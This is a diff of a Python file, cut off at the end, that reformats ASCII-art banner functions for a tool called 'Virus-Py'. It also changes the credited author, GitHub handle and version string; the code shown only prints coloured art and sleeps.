- print(cyan+'''                        hshmmmdddhhdmNmooyhhh+:o/:-                         ''')
- time.sleep(0.01)
- print(cyan+'''                       `+smmNmNNmmmNNNdyyhddmNd+.                      ''')
- time.sleep(0.01)
- print(cyan+'''                         .dmmmNNmmmNNNhyyhddddh.                          ''')
- time.sleep(0.01)
- print(cyan+'''                         `hmmhdNmmmNNMmdssshNdy`                                           ''')
- time.sleep(0.01)
- print(cyan+'''                        -dyh:  .//+/sNmso+-+Ndy+                                               ''')
- time.sleep(0.01)
- print(cyan+'''                         s/s.        dy+s  `:::`                                             ''')
- time.sleep(0.01)
- print(cyan+'''                         -so/.`      h/o:                                                         ''')
- time.sleep(0.01)
- print(cyan+'''                         `hsoys` `   s-y/`                                                   ''')
- time.sleep(0.01)
- print(cyan+'''                          -hdh/`````.h:shh+`````                                             ''')
- time.sleep(0.01)
- print(cyan+'''                        ``.--.``````.Ndh:-.`````````````        ''')
- time.sleep(0.01)
- print(cyan+'''                     `````..`````````:/:.```````````````````                                ''')
- time.sleep(0.01)
- print(cyan+'''                `````````....````````.`..```````````````````                                  ''')
- time.sleep(0.01)
- print(cyan+'''               ``````````......``````-`..```````````````````````                            ''')
- time.sleep(0.01)
- print(cyan+'''        ``````````````````...........-...`````````````````````````````````                   ''')
- time.sleep(0.01)
- print(cyan+'''````````````````````````....----.....--...````````````````````````````````                      ''')
- time.sleep(0.01)
- print(cyan+'''````````````````````````.........-------....``````````````````````````````                     ''')
- time.sleep(0.01)
- print(cyan+'''``````````````````````````........------......`````````````````````````````     ''')
- time.sleep(0.01)
- print(cyan+'''````````````````````````````.........---.......````````````````````````````       ''')
- time.sleep(0.01)
- print(cyan+'''````````````````````````````....................```````````````````````````   ''')
- time.sleep(0.01)
- print(cyan+'''````````````````````````........................``````````````````````````` ''')
- time.sleep(0.01)
- print(cyan+'''................````...............................```````````````````````''')   
- time.sleep(0.01)
- print(cyan+'''................................................................```````''')    
- time.sleep(0.01)
- print(cyan+'''.........'''+green+'Github : https://github.com/kitt-loy'+cyan+'''...............................''') 
- time.sleep(0.01)
- print(cyan+'''........................ UwU  Dzz { '''+red+'Virus-Py'+cyan+''' } .............................''')         
- time.sleep(0.01)
- print(cyan+'''.....................................................................      ''')
- time.sleep(0.01)                              
+
+  print(cyan + '''                                       .-.              ''')
+  time.sleep(0.01)
+  print(cyan + '''                                       : `-`        ''')
+  time.sleep(0.01)
+  print(cyan + '''                                     -o. .:/-           ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''                                     -o   ``:/              ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''                                    .++      .:             ''')
+  time.sleep(0.01)
+  print(cyan +
+        '''                                     ./       .-.               ''')
+  time.sleep(0.01)
+  print(cyan + '''                         ''' + red + 'Virus-Py' + cyan +
+        '''     o..   .  /- -                                     ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                        `.`..-:-`    .sh+-.`:- :`:.                                        '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                        hshmmmdddhhdmNmooyhhh+:o/:-                         '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                       `+smmNmNNmmmNNNdyyhddmNd+.                      '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                         .dmmmNNmmmNNNhyyhddddh.                          '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                         `hmmhdNmmmNNMmdssshNdy`                                           '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                        -dyh:  .//+/sNmso+-+Ndy+                                               '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                         s/s.        dy+s  `:::`                                             '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                         -so/.`      h/o:                                                         '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                         `hsoys` `   s-y/`                                                   '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                          -hdh/`````.h:shh+`````                                             '''
+  )
+  time.sleep(0.01)
+  print(cyan +
+        '''                        ``.--.``````.Ndh:-.`````````````        ''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                     `````..`````````:/:.```````````````````                                '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''                `````````....````````.`..```````````````````                                  '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''               ``````````......``````-`..```````````````````````                            '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''        ``````````````````...........-...`````````````````````````````````                   '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''````````````````````````....----.....--...````````````````````````````````                      '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''````````````````````````.........-------....``````````````````````````````                     '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''``````````````````````````........------......`````````````````````````````     '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''````````````````````````````.........---.......````````````````````````````       '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''````````````````````````````....................```````````````````````````   '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''````````````````````````........................``````````````````````````` '''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''................````...............................```````````````````````'''
+  )
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''................................................................```````'''
+  )
+  time.sleep(0.01)
+  print(cyan + '''.........''' + green +
+        'Github : https://github.com/made-de' + cyan +
+        '''...............................''')
+  time.sleep(0.01)
+  print(cyan + '''........................ XXX  Dzz { ''' + red + 'Virus-Py' +
+        cyan + ''' } .............................''')
+  time.sleep(0.01)
+  print(
+      cyan +
+      '''.....................................................................      '''
+  )
+  time.sleep(0.01)
+
+
 def sem_4():
- 
- print(red+'''                             `...-........`                   ''')
- time.sleep(0.01)
- print(red+'''                        `-:/::::--------:///-                ''')
- time.sleep(0.01)
- print(red+'''                      .//::::--...```.....--/o:`             ''')
- time.sleep(0.01)
- print(red+'''                    `:+/::::--.`         ``..:oo-            ''')
- time.sleep(0.01) 
- print(red+'''                   `/+////:--.`             `.-+y/           ''')
- time.sleep(0.01)
- print(red+'''                   :+///+/:--..`             `.:+y/          ''')
- time.sleep(0.01)
- print(red+'''                  -+///o+::::--...``         ``-:oy-         ''')
- time.sleep(0.01)
- print(red+'''                 `/+/+/oo/:-----::::-.`      ``.:+ys         ''')
- time.sleep(0.01)
- print(red+'''   -/....        .+o+s/o:.``  `.----//:-``````.::+yy         ''')
- time.sleep(0.01)
- print(red+'''   :+so:`.       .ossh++:.``     `.:--/o/:----:::+ys         ''')
- time.sleep(0.01)
- print(red+'''   `/so.``       `oyhdyosys+:``    .//:/soo++//::sy:         ''')
- time.sleep(0.01)
- print(red+'''   -o//:.`.       `ydy+/-sNdo+:.`  `.s+-/yhyyo+:ohy.         ''')
- time.sleep(0.01)
- print(red+'''  `///sys:```      -+++-`sd-./+o/-` `/s/-oo/::::-.:y+        ''')
- time.sleep(0.01)
- print(red+'''    `````:+-`.`    `:/s/.`//:/:/hy/.`-syo+-..`````/s+        ''')
- time.sleep(0.01)
- print(red+'''          `:+.`.`   `-/++.`-/oshdsoyyyysh/-+shmmo/-`         ''')
- time.sleep(0.01)
- print(red+'''            `+/`.-`  :y++s+:.`.``.:yh+yhomNNNMm/+            ''')
- time.sleep(0.01)
- print(red+'''              -+:`-:-s+:oh++/+++osyoyyhmsysyys-o/       .::.  ''')
- time.sleep(0.01)
- print(red+'''               `/o.`/+:+/ho://://+o/o+oyo+--///-       /y/.:. ''')
- time.sleep(0.01)
- print(red+'''                 .+/.:+s+::o++-/::/://+++o:`        `-+o:`-- ''')
- time.sleep(0.01)
- print(red+'''                   -o/+o++-/Nd/::.-.-:::+/    `.-::::-```.s- ''')
- time.sleep(0.01)
- print(red+'''                    `+ho+/:-dMNMNy:/y+/::`.-:::-```......./: ''')
- time.sleep(0.01)
- print(red+'''                      .o++/:/dNmmm/:++::::.``......`         ''')
- time.sleep(0.01)
- print(red+'''                        /++/::::++/+/-.`.--..`               ''')
- time.sleep(0.01)
- print(red+'''                        `+s+/+/:/+s-::--`                    ''')
- time.sleep(0.01)
- print(red+'''                    `.:///oyo+++//+`                         ''')
- time.sleep(0.01)
- print(red+'''                .-:::-..-:++---://-:`                        ''')
- time.sleep(0.01)
- print(red+'''           `-:::-``----.`      `:o:`--`                      ''')
- time.sleep(0.01)
- print(red+'''   `....-:/:-``---.`             `:+:.-.                     ''')
- time.sleep(0.01)
- print(red+'''  --`..-..``--.`                   `-+-.-.                   ''')
- time.sleep(0.01)
- print(red+''' `+/:/:```-.           '''+cyan+'Virus-Py'+red+'''        `:/..:-`                ''')
- time.sleep(0.01)
- print(red+'''    `/y- -`           '''+cyan+'UwU Dzz'+red+'''         `/+/.....-            ''')
- time.sleep(0.01)
- print(red+'''     `++:.                               +o```-::            ''')
- time.sleep(0.01)
- print(red+'''                                         `+/:/-              ''')
- time.sleep(0.01)
+
+  print(red +
+        '''                             `...-........`                   ''')
+  time.sleep(0.01)
+  print(red +
+        '''                        `-:/::::--------:///-                ''')
+  time.sleep(0.01)
+  print(red +
+        '''                      .//::::--...```.....--/o:`             ''')
+  time.sleep(0.01)
+  print(red +
+        '''                    `:+/::::--.`         ``..:oo-            ''')
+  time.sleep(0.01)
+  print(red +
+        '''                   `/+////:--.`             `.-+y/           ''')
+  time.sleep(0.01)
+  print(red +
+        '''                   :+///+/:--..`             `.:+y/          ''')
+  time.sleep(0.01)
+  print(red +
+        '''                  -+///o+::::--...``         ``-:oy-         ''')
+  time.sleep(0.01)
+  print(red +
+        '''                 `/+/+/oo/:-----::::-.`      ``.:+ys         ''')
+  time.sleep(0.01)
+  print(red +
+        '''   -/....        .+o+s/o:.``  `.----//:-``````.::+yy         ''')
+  time.sleep(0.01)
+  print(red +
+        '''   :+so:`.       .ossh++:.``     `.:--/o/:----:::+ys         ''')
+  time.sleep(0.01)
+  print(red +
+        '''   `/so.``       `oyhdyosys+:``    .//:/soo++//::sy:         ''')
+  time.sleep(0.01)
+  print(red +
+        '''   -o//:.`.       `ydy+/-sNdo+:.`  `.s+-/yhyyo+:ohy.         ''')
+  time.sleep(0.01)
+  print(red +
+        '''  `///sys:```      -+++-`sd-./+o/-` `/s/-oo/::::-.:y+        ''')
+  time.sleep(0.01)
+  print(red +
+        '''    `````:+-`.`    `:/s/.`//:/:/hy/.`-syo+-..`````/s+        ''')
+  time.sleep(0.01)
+  print(red +
+        '''          `:+.`.`   `-/++.`-/oshdsoyyyysh/-+shmmo/-`         ''')
+  time.sleep(0.01)
+  print(red +
+        '''            `+/`.-`  :y++s+:.`.``.:yh+yhomNNNMm/+            ''')
+  time.sleep(0.01)
+  print(red +
+        '''              -+:`-:-s+:oh++/+++osyoyyhmsysyys-o/       .::.  ''')
+  time.sleep(0.01)
+  print(red +
+        '''               `/o.`/+:+/ho://://+o/o+oyo+--///-       /y/.:. ''')
+  time.sleep(0.01)
+  print(red +
+        '''                 .+/.:+s+::o++-/::/://+++o:`        `-+o:`-- ''')
+  time.sleep(0.01)
+  print(red +
+        '''                   -o/+o++-/Nd/::.-.-:::+/    `.-::::-```.s- ''')
+  time.sleep(0.01)
+  print(red +
+        '''                    `+ho+/:-dMNMNy:/y+/::`.-:::-```......./: ''')
+  time.sleep(0.01)
+  print(red +
+        '''                      .o++/:/dNmmm/:++::::.``......`         ''')
+  time.sleep(0.01)
+  print(red +
+        '''                        /++/::::++/+/-.`.--..`               ''')
+  time.sleep(0.01)
+  print(red +
+        '''                        `+s+/+/:/+s-::--`                    ''')
+  time.sleep(0.01)
+  print(red +
+        '''                    `.:///oyo+++//+`                         ''')
+  time.sleep(0.01)
+  print(red +
+        '''                .-:::-..-:++---://-:`                        ''')
+  time.sleep(0.01)
+  print(red +
+        '''           `-:::-``----.`      `:o:`--`                      ''')
+  time.sleep(0.01)
+  print(red +
+        '''   `....-:/:-``---.`             `:+:.-.                     ''')
+  time.sleep(0.01)
+  print(red +
+        '''  --`..-..``--.`                   `-+-.-.                   ''')
+  time.sleep(0.01)
+  print(red + ''' `+/:/:```-.           ''' + cyan + 'Virus-Py' + red +
+        '''        `:/..:-`                ''')
+  time.sleep(0.01)
+  print(red + '''    `/y- -`           ''' + cyan + 'XXX Dzz' + red +
+        '''         `/+/.....-            ''')
+  time.sleep(0.01)
+  print(red +
+        '''     `++:.                               +o```-::            ''')
+  time.sleep(0.01)
+  print(red +
+        '''                                         `+/:/-              ''')
+  time.sleep(0.01)
+
+
 def sem_5():
- 
- time.sleep(0.01)
- print(cyan+'                          ````....````')
- time.sleep(0.01)
- print(cyan+'                    `.:oyhmNMMMMMMMMNmdyo/-`')
- time.sleep(0.01)
- print(cyan+'                `./ymMMMMMMNNMMMMMMMNMMMMMMNho-`')
- time.sleep(0.01)
- print(cyan+'              .+hMMMMMMMMMM+ .::/:. -MMMMMMMMMMdo-`') 
- time.sleep(0.01)
- print(cyan+'           `.sNMMMMMMMMMMMm          dMMMMMMMMMMMMy:`')
- time.sleep(0.01)
- print(cyan+'          .oNMMMMMMMMMMMMM/          /MMMMMMMMMMMMMMy-`')
- time.sleep(0.01)
- print(cyan+'        `:mMMMMMMMMMMMMMMm::::::::::::NMMMMMMMMMMMMMMN+`')
- time.sleep(0.01)
- print(cyan+'       `+MMMMMMMMMMMMMMmssssssssssssssssNMMMMMMMMMMMMMMy.')
- time.sleep(0.01)
- print(cyan+'      `oMMMMMMMMMMMMNy/..----:::::-----..+dMMMMMMMMMMMMMh.')
- time.sleep(0.01)
- print(cyan+'     `/MMMMMMMMMMMMMMMMMs.   `-+:`   `:NMMMMMMMMMMMMMMMMMs`')
- time.sleep(0.01)
- print(cyan+'     .mMMMMMMMMMMMMMMMMM+    `/ms.    .NMMMMMMMMMMMMMMMMMM:')
- time.sleep(0.01)
- print(cyan+'    `+MMMMMMMMMMMMMMMMMMMdyydMMMMMmhyhNMMMMMMMMMMMMMMMMMMMh`')
- time.sleep(0.01)
- print(cyan+'    `hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.')
- time.sleep(0.01) 
- print(cyan+'    `mMMMMMMMMMMMMMMMMMMN+mMMMMMMMMMNsyMMMMMMMMMMMMMMMMMMMM-')
- time.sleep(0.01)
- print(cyan+'    `dMMMMMMMMMMMMMMMMMMy  :hMMMMMmo` :MMMMMMMMMMMMMMMMMMMM-')
- time.sleep(0.01)
- print(cyan+'    `yMMMMMMMMMMMMMMMMMM+  `oMMMMMh-  `MMMMMMMMMMMMMMMMMMMN.')
- time.sleep(0.01)
- print(cyan+'     /MMMMMMMMMNdyo+/:::` oNMMMMMMMMh- :::/+oshmMMMMMMMMMMy`')
- time.sleep(0.01)
- print(cyan+'     .dMMMMMMy.          :MMMN`  :MMMy          `/NMMMMMMN-')
- time.sleep(0.01)
- print(cyan+'      :NMMMMN           sMMMMMh .mMMMMd.          oMMMMMMo`')
- time.sleep(0.01)
- print(cyan+'      `/NMMMm           :NMMMMo  dMMMMh           +MMMMMs`')
- time.sleep(0.01)
- print(cyan+'       `:NMMM`           -NMMN.  /MMMd`  `:V/     yMMMMo`')
- time.sleep(0.01)
- print(cyan+'         -hMM+            .mMy    mMd`  ./+++:   `NMMm/`')
- time.sleep(0.01)
- print(cyan+'          `/mm             .m.    +m`            oMNo.')
- time.sleep(0.01)
- print(cyan+'            `+-             `     `.            `do.')
- time.sleep(0.01)
- print(cyan+'              ```       '+green+'Kitt-Loy'+cyan+'{'+red+'Virus-Py'+cyan+'}         `.`')
- time.sleep(0.01)
- print(cyan+'                 ````                      ````')
- time.sleep(0.01)
- print(cyan+'                    ``.:+osyhhhhhhyys+/-```')
- time.sleep(0.01)
- print(cyan+'                            ```````')
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + '                          ````....````')
+  time.sleep(0.01)
+  print(cyan + '                    `.:oyhmNMMMMMMMMNmdyo/-`')
+  time.sleep(0.01)
+  print(cyan + '                `./ymMMMMMMNNMMMMMMMNMMMMMMNho-`')
+  time.sleep(0.01)
+  print(cyan + '              .+hMMMMMMMMMM+ .::/:. -MMMMMMMMMMdo-`')
+  time.sleep(0.01)
+  print(cyan + '           `.sNMMMMMMMMMMMm          dMMMMMMMMMMMMy:`')
+  time.sleep(0.01)
+  print(cyan + '          .oNMMMMMMMMMMMMM/          /MMMMMMMMMMMMMMy-`')
+  time.sleep(0.01)
+  print(cyan + '        `:mMMMMMMMMMMMMMMm::::::::::::NMMMMMMMMMMMMMMN+`')
+  time.sleep(0.01)
+  print(cyan + '       `+MMMMMMMMMMMMMMmssssssssssssssssNMMMMMMMMMMMMMMy.')
+  time.sleep(0.01)
+  print(cyan + '      `oMMMMMMMMMMMMNy/..----:::::-----..+dMMMMMMMMMMMMMh.')
+  time.sleep(0.01)
+  print(cyan + '     `/MMMMMMMMMMMMMMMMMs.   `-+:`   `:NMMMMMMMMMMMMMMMMMs`')
+  time.sleep(0.01)
+  print(cyan + '     .mMMMMMMMMMMMMMMMMM+    `/ms.    .NMMMMMMMMMMMMMMMMMM:')
+  time.sleep(0.01)
+  print(cyan + '    `+MMMMMMMMMMMMMMMMMMMdyydMMMMMmhyhNMMMMMMMMMMMMMMMMMMMh`')
+  time.sleep(0.01)
+  print(cyan + '    `hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.')
+  time.sleep(0.01)
+  print(cyan + '    `mMMMMMMMMMMMMMMMMMMN+mMMMMMMMMMNsyMMMMMMMMMMMMMMMMMMMM-')
+  time.sleep(0.01)
+  print(cyan + '    `dMMMMMMMMMMMMMMMMMMy  :hMMMMMmo` :MMMMMMMMMMMMMMMMMMMM-')
+  time.sleep(0.01)
+  print(cyan + '    `yMMMMMMMMMMMMMMMMMM+  `oMMMMMh-  `MMMMMMMMMMMMMMMMMMMN.')
+  time.sleep(0.01)
+  print(cyan + '     /MMMMMMMMMNdyo+/:::` oNMMMMMMMMh- :::/+oshmMMMMMMMMMMy`')
+  time.sleep(0.01)
+  print(cyan + '     .dMMMMMMy.          :MMMN`  :MMMy          `/NMMMMMMN-')
+  time.sleep(0.01)
+  print(cyan + '      :NMMMMN           sMMMMMh .mMMMMd.          oMMMMMMo`')
+  time.sleep(0.01)
+  print(cyan + '      `/NMMMm           :NMMMMo  dMMMMh           +MMMMMs`')
+  time.sleep(0.01)
+  print(cyan + '       `:NMMM`           -NMMN.  /MMMd`  `:V/     yMMMMo`')
+  time.sleep(0.01)
+  print(cyan + '         -hMM+            .mMy    mMd`  ./+++:   `NMMm/`')
+  time.sleep(0.01)
+  print(cyan + '          `/mm             .m.    +m`            oMNo.')
+  time.sleep(0.01)
+  print(cyan + '            `+-             `     `.            `do.')
+  time.sleep(0.01)
+  print(cyan + '              ```       ' + green + 'made-de' + cyan + '{' +
+        red + 'Virus-Py' + cyan + '}         `.`')
+  time.sleep(0.01)
+  print(cyan + '                 ````                      ````')
+  time.sleep(0.01)
+  print(cyan + '                    ``.:+osyhhhhhhyys+/-```')
+  time.sleep(0.01)
+  print(cyan + '                            ```````')
+  time.sleep(0.01)
+
+
 def sem_6():
- 
- print(cyan+"                      _____________________")
- time.sleep(0.01)
- print(cyan+"                     (  "+blue+ 'UwU   '+cyan+ '##### '+red+ ' UwU  '+cyan+" )")
- time.sleep(0.01)
- print(cyan+"                  /_~~~~~~~~~~~~~~~~~~~~~~~~~_\ ")
- time.sleep(0.01)
- print(cyan+"                /~                             ~\ ")
- time.sleep(0.01)
- print(cyan+'              .~             '+green+'Virus-Py '+cyan+'             ~')
- time.sleep(0.01)
- print(cyan+"          ()\/_____                           _____\/() ")
- time.sleep(0.01)
- print(cyan+"         .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-. ")      
- time.sleep(0.01)
- print('      .-~              ____'+yellow+'I Love you'+cyan+'____             ~-.')  
- time.sleep(0.01)
- print(cyan+"      `~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~` ")
- time.sleep(0.01)
- print(cyan+'      | | |'+green+' #### #### '+cyan+'|| | | | [] | | | || '+green+'#### ####'+cyan+' | | |')  
- time.sleep(0.01)
- print(cyan+"      ;__\|___________|++++++++++++++++++|___________|/__;")
- time.sleep(0.01)
- print(cyan+"       (~~====___________________________________====~~~)")
- time.sleep(0.01)
- print(cyan+"        \------_____________[UwU  DZZ]__________-------/")
- time.sleep(0.01)
- print(cyan+"           |      ||         ~~~~~~~~       ||      |")
- time.sleep(0.01)
- print(cyan+"            \_____/                          \_____/")
- time.sleep(0.01)
+
+  print(cyan + "                      _____________________")
+  time.sleep(0.01)
+  print(cyan + "                     (  " + blue + 'XXX   ' + cyan + '##### ' +
+        red + ' XXX  ' + cyan + " )")
+  time.sleep(0.01)
+  print(cyan + "                  /_~~~~~~~~~~~~~~~~~~~~~~~~~_\ ")
+  time.sleep(0.01)
+  print(cyan + "                /~                             ~\ ")
+  time.sleep(0.01)
+  print(cyan + '              .~             ' + green + 'Virus-Py ' + cyan +
+        '             ~')
+  time.sleep(0.01)
+  print(cyan + "          ()\/_____                           _____\/() ")
+  time.sleep(0.01)
+  print(cyan + "         .-``      ~~~~~~~~~~~~~~~~~~~~~~~~~~~     ``-. ")
+  time.sleep(0.01)
+  print('      .-~              ____' + yellow + 'I Love you' + cyan +
+        '____             ~-.')
+  time.sleep(0.01)
+  print(cyan + "      `~~/~~~~~~~~~~~~TTTTTTTTTTTTTTTTTTTT~~~~~~~~~~~~\~~` ")
+  time.sleep(0.01)
+  print(cyan + '      | | |' + green + ' #### #### ' + cyan +
+        '|| | | | [] | | | || ' + green + '#### ####' + cyan + ' | | |')
+  time.sleep(0.01)
+  print(cyan + "      ;__\|___________|++++++++++++++++++|___________|/__;")
+  time.sleep(0.01)
+  print(cyan + "       (~~====___________________________________====~~~)")
+  time.sleep(0.01)
+  print(cyan + "        \------_____________[XXX  DZZ]__________-------/")
+  time.sleep(0.01)
+  print(cyan + "           |      ||         ~~~~~~~~       ||      |")
+  time.sleep(0.01)
+  print(cyan + "            \_____/                          \_____/")
+  time.sleep(0.01)
+
+
 def sem_7():
- 
- print('')
- time.sleep(0.01)
- print(cyan+"""                     _---------.""")
- time.sleep(0.01)
- print(cyan+"""                 .' #######   ;." """)
- time.sleep(0.01)
- print(cyan+"""      .---,.    ;@             @@`;   .---,.. """)
- time.sleep(0.01)
- print(cyan+"""    ." @@@@@'.,'@@            @@@@@',.'@@@@ ". """)
- time.sleep(0.01)
- print(cyan+"""    '-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;""")
- time.sleep(0.01)
- print(cyan+"""       `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'""")
- time.sleep(0.01)
- print(cyan+"""         "--'.@@@  -.@        @ ,'-   .'--" """)
- time.sleep(0.01)
- print(cyan+"""              ".@' ; @       @ `.  ;'""")
- time.sleep(0.01)
- print(cyan+"""                |@@@@ @@@     @    .""")
- time.sleep(0.01)
- print(cyan+"""                 ' @@@ @@   @@    ,""")
- time.sleep(0.01)
- print(cyan+"""                  `.@@@@    @@   .""")
- time.sleep(0.01)
- print(cyan+"""                    ',@@     @   ;           _____________""")
- time.sleep(0.01)
- print(cyan+"""                     (   3 C    )     /|___ /"""+red+"Virus-Py UwU "+cyan+"""\ """)
- time.sleep(0.01)
- print(cyan+"""                     ;@'. __*__,."    \|--- \_____________/ """)
- time.sleep(0.01)
- print(cyan+"""                      '(.,...."/ """)
- time.sleep(0.01)
- print('')
+
+  print('')
+  time.sleep(0.01)
+  print(cyan + """                     _---------.""")
+  time.sleep(0.01)
+  print(cyan + """                 .' #######   ;." """)
+  time.sleep(0.01)
+  print(cyan + """      .---,.    ;@             @@`;   .---,.. """)
+  time.sleep(0.01)
+  print(cyan + """    ." @@@@@'.,'@@            @@@@@',.'@@@@ ". """)
+  time.sleep(0.01)
+  print(cyan + """    '-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;""")
+  time.sleep(0.01)
+  print(cyan + """       `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'""")
+  time.sleep(0.01)
+  print(cyan + """         "--'.@@@  -.@        @ ,'-   .'--" """)
+  time.sleep(0.01)
+  print(cyan + """              ".@' ; @       @ `.  ;'""")
+  time.sleep(0.01)
+  print(cyan + """                |@@@@ @@@     @    .""")
+  time.sleep(0.01)
+  print(cyan + """                 ' @@@ @@   @@    ,""")
+  time.sleep(0.01)
+  print(cyan + """                  `.@@@@    @@   .""")
+  time.sleep(0.01)
+  print(cyan +
+        """                    ',@@     @   ;           _____________""")
+  time.sleep(0.01)
+  print(cyan + """                     (   3 C    )     /|___ /""" + red +
+        "Virus-Py XXX " + cyan + """\ """)
+  time.sleep(0.01)
+  print(cyan +
+        """                     ;@'. __*__,."    \|--- \_____________/ """)
+  time.sleep(0.01)
+  print(cyan + """                      '(.,...."/ """)
+  time.sleep(0.01)
+  print('')
+
+
 def sem_8():
- 
- time.sleep(0.01)
- print(cyan +'          _____________________________________________    ')
- time.sleep(0.01)           
- print(cyan +'         !\___________________________________________/!\ ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !! \ ')
- time.sleep(0.01)          
- print(cyan +'         !!           Welcome to { '+red+'Virus-Py'+cyan+' }           !!  \ ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!  version :  { '+red+'2.0v'+cyan+' }                     !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!  programmer :  { '+red+'Kitt-Loy'+cyan+' }                !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)        
- print(cyan +'         !!  github :  { '+red+'kitt-loy/Virus-Py'+cyan+' }         !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  ! ')
- time.sleep(0.01)         
- print(cyan +'         !!                                           !!  / ')
- time.sleep(0.01)        
- print(cyan +'         !!___________________________________________!! / ')
- time.sleep(0.01)        
- print(cyan +'         !/___________________________________________\!/ ')
- time.sleep(0.01)        
- print(cyan +'            __\_____________________________________/__/!_ ')
- time.sleep(0.01)           
- print(cyan +'           !_________________________________________!/    ')       
- time.sleep(0.01)           
- print(cyan +'              _____________________________________    ')
- time.sleep(0.01)              
- print(cyan +'            /oooo  oooo  oooo  oooo  oooo  oooo /!      ')    
- time.sleep(0.01)           
- print(cyan +'           /ooooooooooooooooooooooooooooooooooo/ / ')
- time.sleep(0.01)           
- print(cyan +'          /ooooooooooooooooooooooooooooooooooo/ / ')
- time.sleep(0.01)         
- print(cyan +'         /ooooooooooooooooooooooooooooooooooo/ / ')
- time.sleep(0.01)        
- print(cyan +'        /C=_________________________________/_/ ')
- time.sleep(0.01)
+
+  time.sleep(0.01)
+  print(cyan + '          _____________________________________________    ')
+  time.sleep(0.01)
+  print(cyan + '         !\___________________________________________/!\ ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !! \ ')
+  time.sleep(0.01)
+  print(cyan + '         !!           Welcome to { ' + red + 'Virus-Py' +
+        cyan + ' }           !!  \ ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!  version :  { ' + red + '2.1v' + cyan +
+        ' }                     !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!  programmer :  { ' + red + 'made-de' + cyan +
+        ' }                !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!  github :  { ' + red + 'made-de/Virus-Py' + cyan +
+        ' }         !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  ! ')
+  time.sleep(0.01)
+  print(cyan + '         !!                                           !!  / ')
+  time.sleep(0.01)
+  print(cyan + '         !!___________________________________________!! / ')
+  time.sleep(0.01)
+  print(cyan + '         !/___________________________________________\!/ ')
+  time.sleep(0.01)
+  print(cyan + '            __\_____________________________________/__/!_ ')
+  time.sleep(0.01)
+  print(cyan + '           !_________________________________________!/    ')
+  time.sleep(0.01)
+  print(cyan + '              _____________________________________    ')
+  time.sleep(0.01)
+  print(cyan + '            /oooo  oooo  oooo  oooo  oooo  oooo /!      ')
+  time.sleep(0.01)
+  print(cyan + '           /ooooooooooooooooooooooooooooooooooo/ / ')
+  time.sleep(0.01)
+  print(cyan + '          /ooooooooooooooooooooooooooooooooooo/ / ')
+  time.sleep(0.01)
+  print(cyan + '         /ooooooooooooooooooooooooooooooooooo/ / ')
+  time.sleep(0.01)
+  print(cyan + '        /C=_________________________________/_/ ')
+  time.sleep(0.01)
+
+
 def sem_9():
- 
- time.sleep(0.01)
- print(red+'                        ..:::::::::..       ')
- time.sleep(0.01)
- print(red+'                    ..:::aad8888888baa:::..      ') 
- time.sleep(0.01)
- print(red+'                .::::d:?88888888888?::8b::::.      ')
- time.sleep(0.01)
- print(red+'              .:::d8888:?88888888??a888888b:::.      ')  
- time.sleep(0.01)
- print(red+'            .:::d8888888a8888888aa8888888888b:::.      ')
- time.sleep(0.01)
